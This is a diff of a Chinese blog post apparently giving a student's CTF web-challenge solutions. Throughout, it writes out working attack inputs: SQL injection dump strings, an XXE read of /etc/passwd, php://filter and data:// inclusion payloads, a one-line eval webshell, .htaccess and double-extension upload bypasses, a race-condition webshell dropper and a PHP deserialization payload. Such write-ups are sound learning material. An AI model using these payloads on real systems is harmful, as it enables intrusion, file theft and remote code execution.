@@ -28,7 +28,7 @@
 <meta property="og:description" content="看web看得头大……遂决定先把moe25和26的wp传了再说（看tsctf的题好难&#x2F;(ㄒoㄒ)&#x2F;~~">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-09-05T14:54:07.000Z">
-<meta property="article:modified_time" content="2026-09-06T02:56:28.460Z">
+<meta property="article:modified_time" content="2026-09-06T14:35:59.644Z">
 <meta property="article:author" content="aClosure">
 <meta property="article:tag" content="omakase">
 <meta property="article:tag" content="dev">
@@ -207,7 +207,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-09-06 10:56:28" itemprop="dateModified" datetime="2026-09-06T10:56:28+08:00">2026-09-06</time>
+                <time title="修改时间：2026-09-06 22:35:59" itemprop="dateModified" datetime="2026-09-06T22:35:59+08:00">2026-09-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -265,11 +265,13 @@
 <p>前尘傀儡：”从<a target="_blank" rel="noopener" href="http://panshi/entry%E6%9D%A5%E2%80%9C%EF%BC%8C%E6%9B%B4%E6%94%B9Referer%E5%8D%B3%E5%8F%AF">http://panshi/entry来“，更改Referer即可</a></p>
 </li>
 <li>
-<p>逆转傀儡：PUT一个”新生！“上去即可（别忘了<strong>感叹号</strong>，并且更改Content-Type）<br>
-<u>PUT /rebirth HTTP/1.1 Host: 逆转傀儡 Content-Type: text/plain 新生！</u><br>
-<u>关键：使用PUT方法；简单设置Content-Type；在Body中传递一个象征&quot;新生&quot;的信息</u></p>
+<p>逆转傀儡：PUT一个”新生！“上去即可（别忘了<strong>感叹号</strong>，并且更改Content-Type）</p>
 </li>
 </ol>
+<blockquote>
+<p><u>PUT /rebirth HTTP/1.1 Host: 逆转傀儡 Content-Type: text/plain 新生！</u><br>
+<u>关键：使用PUT方法；简单设置Content-Type；在Body中传递一个象征&quot;新生&quot;的信息</u></p>
+</blockquote>
 <h2 id="T5-打上门来！">T5-打上门来！</h2>
 <p>别给首页那个破阵的文件骗了……那个是T4的，第一次做顺序放反了，被坑了好久（泣）</p>
 <p>…/…/穿越回主目录下即可发现flag</p>
@@ -286,11 +288,13 @@
 <p>输入预期错误admin’ and 1=2#，显示登陆错误，实锤是sql注入</p>
 <p>admin’ order by 3#起报错，说明就user和pwd两列</p>
 <p>-1’ union select 1111,2222#，回显1111，说明pwd的字段是黑盒（注意，<strong>不要再用admin</strong>！！！admin存在就会一直报welcomeadmin，啥也拿不到）</p>
-<p>爆库名：-1’ union select database(),2222# ，发现在user库</p>
-<p>爆表名：-1’ union select table_name,2222 from information_schema.tables where table_schema = database() #，回显welcome flag</p>
+<p><em>爆库名</em>：-1’ union select database(),2222# ，发现在user库</p>
+<p><em>爆表名</em>：-1’ union select table_name,2222 from information_schema.tables where table_schema = database() #，回显welcome flag</p>
 <p>注意：“爆表名”时，where跟的是table_<strong>schema</strong>，且值写database，不要具体写user（待补充</p>
-<p>爆列名：-1’ union select column_name,2222 from information_schema.columns where table_schema = database() <u>and table_name =</u> <strong>‘flag’</strong> #，得到回显welcome value</p>
+<p><em>爆列名</em>：-1’ union select column_name,2222 from information_schema.columns where table_schema = database() <u>and table_name =</u> <strong>‘flag’</strong> #，得到回显welcome value</p>
+<blockquote>
 <p>注意：flag要加双引号（泣），上面的原因也是这个</p>
+</blockquote>
 <p>爆字段：-1’ union select value,2 from flag #，得到flag</p>
 <h2 id="T9-星墟禁制·天机问路">T9-星墟禁制·天机问路</h2>
 <p><s>看网上wp，说是个SSRF漏洞，明天继续更（）</s></p>
@@ -312,7 +316,7 @@
 <p>可知大概是网址被拼接到nslookup这种系统命令底下，故而可以使用管道符或者分号直接执行后头的命令</p>
 <h2 id="T10-天机符阵">T10-天机符阵</h2>
 <p>试图直接env逃课（），但是返回报错：</p>
-<p><code>&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: DOMDocument::loadXML(): Start tag expected, '&amp;lt;' not found in Entity, line: 1 in &lt;b&gt;/var/www/html/chapter10.php&lt;/b&gt; on line &lt;b&gt;17&lt;/b&gt;&lt;br /&gt;&lt;阵枢&gt;引魂玉&lt;/阵枢&gt;&lt;解析&gt;未定义&lt;/解析&gt;&lt;输出&gt;未定义&lt;/输出&gt;</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`<span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>: DOMDocument::loadXML(): Start tag expected, &#x27;<span class="symbol">&amp;lt;</span>&#x27; not found in Entity, line: 1 in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/chapter10.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>17<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">阵枢</span>&gt;</span>引魂玉<span class="tag">&lt;/<span class="name">阵枢</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">解析</span>&gt;</span>未定义<span class="tag">&lt;/<span class="name">解析</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">输出</span>&gt;</span>未定义<span class="tag">&lt;/<span class="name">输出</span>&gt;</span>`</span><br></pre></td></tr></table></figure>
 <p>注意到后端使用 <code>DOMDocument::loadXML()</code> 解析用户输入，存在典型的 <strong>XXE（XML External Entity）漏洞</strong>，<s>速去helloctf补课</s></p>
 <p>阵枢和输出未定义，这里尝试&lt;输出&gt;test&lt;/输出&gt;，发现可以正常得到回显（开心o(<em>￣▽￣</em>)ブ</p>
 <p>尝试如下：</p>
@@ -323,17 +327,87 @@
 <?xml version="1.0"?>
 <!DOCTYPE root [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
-<p>]&gt;<br>
-<root><br>
-&lt;输出&gt;&amp;xxe;&lt;/输出&gt;<br>
-</root></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt; </span><br><span class="line">&lt;输出&gt;&amp;xxe;&lt;/输出&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
 <p>发现有回显，说明目标确实为linux，且存在 <strong>任意文件读取（XXE/LFI）</strong> 漏洞。</p>
 <p>又因为题目已经提示“文件在flag.txt中”，故用这个漏洞访问file:///var/www/html/flag.txt即可</p>
 <h2 id="T11-千机变·破妄之眼">T11-千机变·破妄之眼</h2>
 <p>“<strong>GET</strong> 参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入”，故而先使用python生成120个payload，然后bp爆破即可（脚本等下试试</p>
 <p>爆破这块有点诡异，不知道怎么回事bp总是不行…改天继续试，这里参考wp先跳过到find.php</p>
 <p>访问flag.php被嘲讽🤬</p>
-<p>考虑使用filter什么的绕过，<s>笔者这里暂时要出门，先停一下（）</s></p>
+<p>考虑使用filter绕过查看注释：</p>
+<blockquote>
+<p>将./flag.php改为 php://filter/read=convert.base64-encode/resource=./flag.php 即可，解码后可以得到flag</p>
+</blockquote>
+<h2 id="T12-玉魄玄关·破妄">T12-玉魄玄关·破妄</h2>
+<blockquote>
+<p>这道题用于学习 <strong>蚁剑</strong> 的使用，请使用 <strong>蚁剑</strong> 完成本题</p>
+</blockquote>
+<p>发现后端：</p>
+<?php
+highlight_file(__FILE__);
+@eval($_POST['cmd'])
+
+和疯了一样，是一段密码cmd的一句话木马，蚁剑直接就连到服务器，env即可
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+~~和疯了一样~~，是一段密码cmd的一句话木马，蚁剑直接就连到服务器，env即可
+
+## T13-通幽关·灵纹诡影
+
+文件上传漏洞，但是只检查了文件的16进制头和后缀名，把上面的一句话木马修改文件头，上传后同T12
+
+## T14-御神关·补天玉碑
+
+> 省流：Apache有一个特殊文件，是什么呢？
+
+W1：由题得，web server是用的apache，而在1，2大版本号的Apache中，会从后往前解析文件类型，直到认识为止，所以可以考虑将那个cmd木马文件名改为**cmd.php.ra**r，从而绕过（）你也不过滤我压缩包啊（笑
+
+W2：“禁止上传攻伐符咒（如.php, .php5, .jsp, .asp等邪道术法）”，可知仍然是限制了上传类型，在Apache 服务器启用了 `AllowOverride` 选项，允许 `.htaccess` 文件覆盖默认配置的情况下，可以考虑 .htaccess 解析绕过，从而让特定类型/特定文件以php类型解析（当然，我们假设出题人是善良的）：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php  # ForceType是AddType的等价形式，可以据此绕开不完全的关键词屏蔽</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+
+之后上传cmd.php.jpg即可
+
+## T15-归真关·竞时净魔
+
+> 符文上传后将进行「重命名净化」，魔气会快速清除违规符文，请把握时机！
+
+可知本题考查条件竞争下的文件上传，又发现：
+
+> 图片上传至/uploads
+
+故而可知，访问uploads目录下上传的图片即可，这里使用bp同时无限上传和访问，然后yukuri地用蚁剑连就好了
+
+但是我们尝试用上面的cmd木马，十分钟后无果，询问ds，发现条件竞争还要输密码的话，基本就别想命中了（泣），所以我们改用木马：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;pass.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span>);   </span><br><span class="line">   <span class="comment"># 不要用phpinfo，它只是个探针，没法蚁剑</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+用它创建一个pass.php在上传的目录下，并w（write）后面的内容（这种情况apache只会删除你传上来的原文件，pass.php得以保留）
+
+不知道为什么始终不行，明天继续试
+
+## T16-**昆仑星途**
+
+~~牛魔这段是重写的，typedown什么垃圾编辑器滚一边去吧(ノ｀Д)ノ~~
+
+打开后发现是一段php：
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+打开附件的php.ini发现：
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[PHP]</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span></span><br></pre></td></tr></table></figure>
+
+在这两者都启用的情况下，可以使用data://伪协议，通过文件包含漏洞找flag：
+
+故输入/?file=data://text/plain,<?php system('env') ?>，结果牛魔什么都没有，出题人坏🤬
+<p>这次尝试ls /，发现一个随机生成的flag文件，cat /flag-一堆.txt即可</p>
+<h2 id="T17-星骸迷阵·神念重构">T17-<strong>星骸迷阵·神念重构</strong></h2>
+<p>发现php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>是个反序列化漏洞利用，unserialize结束时对象自动销毁，会触发__destruct()这个魔术方法，故而构造：</p>
+<p>/?a=O:1:“A”:1:{s:1:“a”;s:13:“system(‘env’);”;}即可得到flag，出题人好😋</p>
 
     </div>
 
@@ -434,7 +508,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T1-%E4%B8%87%E8%A8%80%E5%90%AF%E5%B0%81%E5%92%92"><span class="nav-number">1.</span> <span class="nav-text">T1-万言启封咒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T2-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">2.</span> <span class="nav-text">T2-初识金曦玄轨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">T3-问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T4-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">4.</span> <span class="nav-text">T4-金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T5-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">T5-打上门来！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T6-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">6.</span> <span class="nav-text">T6-藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T7-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">7.</span> <span class="nav-text">T7-灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T8-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="nav-number">8.</span> <span class="nav-text">T8-天衍真言，星图显圣</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T9-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">9.</span> <span class="nav-text">T9-星墟禁制·天机问路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T10-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">10.</span> <span class="nav-text">T10-天机符阵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T11-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="nav-number">11.</span> <span class="nav-text">T11-千机变·破妄之眼</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T1-%E4%B8%87%E8%A8%80%E5%90%AF%E5%B0%81%E5%92%92"><span class="nav-number">1.</span> <span class="nav-text">T1-万言启封咒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T2-%E5%88%9D%E8%AF%86%E9%87%91%E6%9B%A6%E7%8E%84%E8%BD%A8"><span class="nav-number">2.</span> <span class="nav-text">T2-初识金曦玄轨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T3-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">T3-问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T4-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">4.</span> <span class="nav-text">T4-金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T5-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">5.</span> <span class="nav-text">T5-打上门来！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T6-%E8%97%8F%E7%BB%8F%E7%A6%81%E5%88%B6%EF%BC%9F%E7%8E%84%E6%9C%BA%E5%88%9D%E6%8E%A2%EF%BC%81"><span class="nav-number">6.</span> <span class="nav-text">T6-藏经禁制？玄机初探！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T7-%E7%81%B5%E8%9B%9B%E6%8E%A2%E7%A9%B4%E4%B8%8E%E9%98%B4%E9%98%B3%E5%8F%8C%E7%94%9F%E7%AC%A6"><span class="nav-number">7.</span> <span class="nav-text">T7-灵蛛探穴与阴阳双生符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T8-%E5%A4%A9%E8%A1%8D%E7%9C%9F%E8%A8%80%EF%BC%8C%E6%98%9F%E5%9B%BE%E6%98%BE%E5%9C%A3"><span class="nav-number">8.</span> <span class="nav-text">T8-天衍真言，星图显圣</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T9-%E6%98%9F%E5%A2%9F%E7%A6%81%E5%88%B6%C2%B7%E5%A4%A9%E6%9C%BA%E9%97%AE%E8%B7%AF"><span class="nav-number">9.</span> <span class="nav-text">T9-星墟禁制·天机问路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T10-%E5%A4%A9%E6%9C%BA%E7%AC%A6%E9%98%B5"><span class="nav-number">10.</span> <span class="nav-text">T10-天机符阵</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T11-%E5%8D%83%E6%9C%BA%E5%8F%98%C2%B7%E7%A0%B4%E5%A6%84%E4%B9%8B%E7%9C%BC"><span class="nav-number">11.</span> <span class="nav-text">T11-千机变·破妄之眼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T12-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">12.</span> <span class="nav-text">T12-玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T17-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">13.</span> <span class="nav-text">T17-星骸迷阵·神念重构</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
